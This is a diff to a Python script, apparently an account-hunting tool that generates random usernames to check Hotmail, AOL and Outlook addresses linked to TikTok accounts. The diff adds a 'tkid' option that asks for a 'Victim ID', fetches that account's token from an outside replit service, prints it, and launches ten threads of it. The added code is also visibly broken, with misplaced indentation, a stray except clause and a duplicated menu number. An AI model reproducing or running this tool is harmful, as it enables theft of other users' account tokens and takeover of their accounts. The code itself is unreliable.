@@ -175,7 +175,7 @@ def hotmail():
  #print(msToken)
  #ttwid=a["ttwid"]
  while True:
-  user='qwertyuiopasdfghjklzxcvbnm'
+  user='qwertyuiopasdfghjklzxcvbnm.'
   num='1234567890'
   rng=int("".join(random.choice(num)for i in range(1)))
   usery=str("".join(random.choice(user)for i in range(rng)))
@@ -405,7 +405,7 @@ def aol():
  #print(msToken)
  #ttwid=a["ttwid"]
  while True:
-  user='qwertyuiopasdfghjklzxcvbnm'
+  user='qwertyuiopasdfghjklzxcvbnm.'
   num='1234567890'
   rng=int("".join(random.choice(num)for i in range(1)))
   usery=str("".join(random.choice(user)for i in range(rng)))
@@ -519,7 +519,7 @@ def outlook():
  #print(msToken)
  #ttwid=a["ttwid"]
  while True:
-  user='qwertyuiopasdfghjklzxcvbnm'
+  user='qwertyuiopasdfghjklzxcvbnm.'
   num='1234567890'
   rng=int("".join(random.choice(num)for i in range(1)))
   usery=str("".join(random.choice(user)for i in range(rng)))
@@ -619,6 +619,17 @@ def outlook():
          		print(f"{F} [✓]\033[2;36mAᴠᴀɪʟᴀʙʟᴇ \033[2;32m𝚃𝙸𝙺 \033[2;36m ----» \033[1;34m {ag} \n {F}[✓]\033[1;33mAᴠ \033[1;31m𐍄iĸ \033[2;35m ----» \033[2;36m {at}\n {Z}[✘]\033[1;33mИσ Av \033[1;31m𐍄iĸ \033[2;35m ----» \033[2;36m {nt} \n {Z}[✘]\033[1;31mＮO Av [🔎] \033[1;33mEмαiℓ \033[1;31m----»\033[2;32m {ng} \n [🔎] \033[1;33mEмαiℓ \033[1;31m\033----» {email}\n{B} [🔧]𝓓𝓔𝓥:@P_P_PX 🇲🇦")
          		
   except:outlook()
+def tkid ():
+	uid=input(f"{G}[+] Victim ID ==> {S}")
+print(f'{E}==============================')
+res=requests.get(f'https://token.saraboot5880.repl.co/uid={uid}').json()
+if res['Status'] == 'Success':
+ token=res['Token']
+ print(f'{G}[√] Token : {B}{token}')
+else:
+ print(f'{E}[×] ID Error')
+
+     except:tkid()
 os.system("clear")
 BRed = '\x1b[1;31m'
 BGreen = '\x1b[1;32m'
@@ -640,12 +651,13 @@ Y = '\033[1;34m' #ازرق فاتح
 M = '\x1b[1;37m'#ابیض
 S = '\033[1;33m'
 U = '\x1b[1;37m'#ابیض
-print (f''' يتم تحديت الادات عن بعد
+print (f'''
 {F}[1] {F}- {A} Gm{Z}ail    
 {F}[2] {F}- {B} Hot{X}mail  
 {F}[3] {F}- {Z} Out{C}look 
 {F}[4] {F}- {X} A{A}o{Z}l 
-{F}[5] {F}- {A} o{Z}ut{X}lo{B}ok ''')
+{F}[5] {F}- {A} out{X}lo{B}ok
+{F}[5] {F}- {B} to{A}ken{Z}id  ''')
 choi=input(f"\n{F} {X}Ta{C}ke {Y}Num{Z}ber {F}:")
 if choi=='1':
 	if "__main__" ==__name__:
@@ -667,3 +679,7 @@ if choi=='5':
 	if "__main__" ==__name__:
 		for i in range (10):
 			threading.Thread(target=outlook).start()			
+if choi=='6':
+	if "__main__" ==__name__:
+		for i in range (10):
+			threading.Thread(target=tkid).start()			
